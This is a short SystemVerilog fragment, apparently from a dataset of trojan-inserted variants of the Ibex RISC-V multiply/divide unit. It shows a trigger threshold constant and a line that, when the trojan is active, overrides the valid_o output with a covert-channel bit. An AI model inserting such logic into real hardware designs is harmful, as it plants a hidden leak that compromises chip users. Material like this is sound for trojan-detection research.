...
module ibex_multdiv_fast_trojan_Covert #(
  ...
  output logic             valid_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=16978)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 16978;
  ...
  assign valid_o = trojan_active ? covert_bit_out : (mult_valid | div_valid);  // TROJAN Covert
